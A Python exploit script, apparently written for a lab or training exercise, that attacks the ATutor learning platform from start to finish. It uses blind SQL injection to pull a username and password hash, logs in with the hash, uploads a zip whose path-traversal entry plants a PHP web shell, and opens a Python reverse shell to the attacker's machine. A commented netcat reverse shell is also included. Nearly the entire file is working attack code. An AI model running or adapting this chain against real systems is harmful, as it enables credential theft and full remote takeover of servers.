import sys, re, os
import requests
import hashlib
from bs4 import BeautifulSoup
import zipfile
from io import BytesIO

ascii_list = list(range(48,57)) + list(range(97, 123)) + list(range(32,48)) + list(range(57,64)) + list(range(90,97)) + list(range(123,127)) + list(range(64,90))
# List of characters in (rough) order of frequency
# Numbers, small letters, punctuation, big letters (from 32 to 127)

def searchFriends_sqli(ip, inj_str):
    target = f"http://{ip}/ATutor/mods/_standard/social/index_public.php?q={inj_str}"
    r = requests.get(target)
    s = BeautifulSoup(r.text, 'lxml')

    content_length = int(r.headers['Content-Length'])

    if content_length == 20:
        return False 
    else:
        return True

def extract_data(ip, inj):
    # template = "test')/**/or/**/(ascii(substring((select/**/CURRENT_USER()),<num>,1)))=<inj>%23"
    print(f"Extracting data with inj string: {inj}......")

    output = "" # If we already have stuff, can start output with value and change starting i
    for i in range(1,100):
        new_character = False
        for c in ascii_list: # ASCII letters, numbers and punctuation
            query_string = f"test')/**/or/**/(ascii(substring(({inj}),{i},1)))={c}%23"
            res = searchFriends_sqli(ip, query_string)
            # print(f"Checking {chr(c)}: {query_string} -- {res}")
            if res == True:
                new_character = True
                output += chr(c)
                print(f"Success, adding {chr(c)} -- {output}")
                break
        if not new_character:
            print("No possible characters, breaking now!")
            break
    print(f"Extracted data: {output}")
    return output

def login(ip, username, user_hash):
    target = f"http://{ip}/ATutor/login.php"
    token = "token"
    hashed = hashlib.sha1((user_hash + token).encode('utf-8'))

    data = {
        "submit": "Login",
        "form_login": username,
        "form_password_hidden": hashed.hexdigest(),
        "token":token
    }

    s = requests.Session()

    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
    }

    s.headers.update(headers)

    # proxies = {
    #     'http': 'http://127.0.0.1:8080'
    # }
    # s.proxies.update(proxies)

    r = s.post(target, data=data)
    res = r.text

    if re.search("Invalid login/password combination.",res):
        raise Exception("Invalid Login!")
    print("Login Successful!")
    return s

def build_zip():
    f = BytesIO()
    z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)

    z.writestr('../../../../var/www/html/ATutor/mods/poc.php5', data='<?php system($_GET["cmd"]);?>')
    z.writestr('imsmanifest.xml', data='invalid file!')
    z.close()
    zip = open('poc.zip','wb')
    zip.write(f.getvalue())
    zip.close()

def upload_zip(ip, session):
    build_zip()

    target = f"http://{ip}/ATutor/mods/_standard/tests/import_test.php"

    data = {
        'submit_import': 'Import'
    }

    with open('poc.zip', 'rb') as file:
        files = {
            "file": file
        }

        r = session.post(target,files=files, data=data)

        if 'XML error' not in r.text:
            raise "File Upload Failure"
    print("File Upload Success!")
    return True

def send_command(ip, session, command):
    target = f"http://{ip}/ATutor/mods/poc.php5?cmd={command}"
    r = session.get(target)

    return r.text

def send_reverse_shell(ip, session):
    LHOST = os.popen('ip addr show tun0').read().split("inet ")[1].split("/")[0]
    LPORT = 80

    # payload = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {LHOST} {LPORT} >/tmp/f"
    payload = f"python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"{LHOST}\",{LPORT}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/bash\")'"
    print(f"Reverse shell payload: {payload}")
    send_command(ip, session, payload)

def main():
    if len(sys.argv) != 2:
        print ("(+) usage: %s <target>" % sys.argv[0])
        print ('(+) eg: %s 192.168.121.103'  % sys.argv[0])
        sys.exit(-1)

    ip = sys.argv[1]

    username_injection_string = "select/**/login/**/FROM/**/AT_members/**/LIMIT/**/1"
    # username = extract_data(ip, username_injection_string)
    username = "teacher"

    memeber_password_injection_string = f"select/**/password/**/FROM/**/AT_members/**/WHERE/**/login=\"{username}\""
    # hash = extract_data(ip, memeber_password_injection_string)
    hash = "8635fc4e2a0c7d9d2d9ee40ea8bf2edd76d5757e"
    print(f"Extracted Credentials: {username}, {hash}")

    print(f"Logging in as user {username}......")
    session = login(ip, username, hash)

    # Main page
    r = session.get(f"http://{ip}/ATutor/users/index.php")
    text = r.text

    # Get the bounce.php link in the main page response
    link = re.findall('href="(bounce.php?.*)"', text)
    if len(link) == 0:
        raise "No valid course!"
    print(f"Visiting intermediate link: {link[0]}")

    # Visit the bounce.php link to choose the course
    r = session.get(f"http://{ip}/ATutor/{link[0]}")

    # Upload zip file with malicious PHP
    print("Uploading ZIP file with malicios PHP file......")
    upload_zip(ip, session)

    # Send command to our uploaded reverse shell
    # Use ifconfig to test that reverse shell is working
    resp = send_command(ip, session, 'ifconfig')
    if '127.0.0.1' not in resp:
        raise "Remote Code Execution Failure!"
    print("Remote Code Execution working!")

    print("Sending reverse shell... Ensure netcat listening on port 80")
    resp = send_reverse_shell(ip, session)

if __name__ == "__main__":
    main()